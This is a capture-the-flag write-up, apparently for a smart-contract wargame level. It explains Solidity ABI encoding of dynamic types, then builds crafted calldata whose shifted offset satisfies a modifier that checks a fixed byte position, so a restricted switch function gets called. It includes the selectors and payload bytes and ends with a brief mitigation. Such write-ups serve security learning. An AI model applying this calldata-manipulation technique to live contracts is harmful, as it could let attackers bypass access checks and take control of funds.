## Objectives

1. Flip the switch. Easy right?

## Vulnerabilities

### Assuming positions in `calldata` with dynamic types.

The way _Dynamic types_ are encoded when passed as function arguments is not straightforward. They are encoded in the 
following sequence:

- 32 bytes for the **offest** value which indicates where the dynamic data starts. For instance, 0x20 (or 32 in decimals) means that
the dynamic data starts exactly 32 bytes after this field. This allows the fixed-length portion of the function arguments 
to be densely packed together, saving space.

- 32 bytes of the **length** value which specifies the length of the data. 0x04 means that the bytes argument is 4 bytes long.

- Finally, you have the actual data.

since the **offset** and **length** vary, you can't assume specific position in the `calldata`. This could
be exploited.


## Exploit

it's quite straightforward to see that we want to call `flipSwitch` with some data in a way for `turnSwitchOn` 
to be called by the contract itself. Let's investigate deeper.

`flipSwitch` has the function modifier `onlyOff` which is the following:

```solidity
modifier onlyOff() {
    // we use a complex data type to put in memory
    bytes32[1] memory selector;
    // check that the calldata at position 68 (location of _data)
    assembly {
        calldatacopy(selector, 68, 4) // grab function selector from calldata
    }
    require(
        selector[0] == offSelector,
        "Can only call the turnOffSwitch function"
    );
    _;
}
```

The inline assembly assigns the selector variable to the value of the 4 bytes starting at the 68th byte in the `calldata`.
The `require`function needs those 4 bytes to be the function selector of `turnSwitchOff`. If we can somehow create a 
`calldata` that has `turnSwitchOff` at the 68th bytes while also having the `turnSwitchOn` function selector, we could 
probably exploit the contract.

1. Let's find the function selector of  `turnSwitchOff` and `turnSwitchOn`. Let's do this using web3 in the console:
```javascript
const offSelector = web3.eth.abi.encodeFunctionSignature("turnSwitchOff()"); 
// 0x20606e15
const onSelector = web3.eth.abi.encodeFunctionSignature("turnSwitchOn()"); 
// 0x76227e12
```

2. Next since I'm too lazy to look into the docs and figure out by hand how calling `flipSwitch` with an argument is encoded
into, let's log it out in the console using web3 again.


```javascript
const calldata = web3.eth.abi.encodeFunctionCall({
  name: 'flipSwitch',
  type: 'function',
  inputs: [{ type: 'bytes', name: '_data' }]
}, [offSelector]);
// 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000
```

Let's make sense of this byte array monster using what we know about dynamic and a trusty <a target="\_blank" rel="noopener noreferrer" hre="https://wordcounter.net/character-count">character counter</a>.

- `0x` Doesn't count, it just indicates we are dealing in bytes.  

- `30c13ade` 4 bytes representing the function selector of `flipSwitch` with `offSelector` or `"0x20606e15"` as argument.  

- `0000000000000000000000000000000000000000000000000000000000000020` 32 bytes representing a 32 (0x20 in decimal) bytes offset.  

- `0000000000000000000000000000000000000000000000000000000000000004` 32 bytes representing the length of the value. Only 4 bytes long in this case.  

- `20606e1500000000000000000000000000000000000000000000000000000000` 32 bytes which is the `offSelector` right padded by 28 bytes of zeroes.  


3. Let's create our own `calldata` with `offSelector` at the 68th byte but let's tell the EVM to look for the value 
of the argument elsewhere and we will point it to the value of `onSelector`.

- `0x` Doesn't count, it just indicates we are dealing in bytes.  

- `30c13ade` Same 4 bytes representing the function selector of `flipSwitch` with `offSelector` or `"0x20606e15"` as argument.  

- `0000000000000000000000000000000000000000000000000000000000000060` 32 bytes representing a 96 (0x60 in decimal) bytes offset. This is how
we exploit the `onlyOff` function modifier.  

- `0000000000000000000000000000000000000000000000000000000000000000` Some extra bytes that we introduces with the new padding.  

- `20606e1500000000000000000000000000000000000000000000000000000000` 32 bytes which is the `offSelector` right padded by 28 bytes of zeroes. 
It is still at the 68th byte and so the `onlyOff` require function will be happy.  

- `0000000000000000000000000000000000000000000000000000000000000004` 32 bytes representing the length of the value which is 4.  

- `76227e1200000000000000000000000000000000000000000000000000000000` 32 bytes which is the `onSelector` right padded with zeroes.  


4. All that is left is to call `flipSwitch` with the listed byte strings concatenated into a giant one.

## Suggested mitigation

1. Adding additionnal verification in the `calldata` could help prevent this but I would suggest to avoid
relying on low level call like this when it's not necessary.
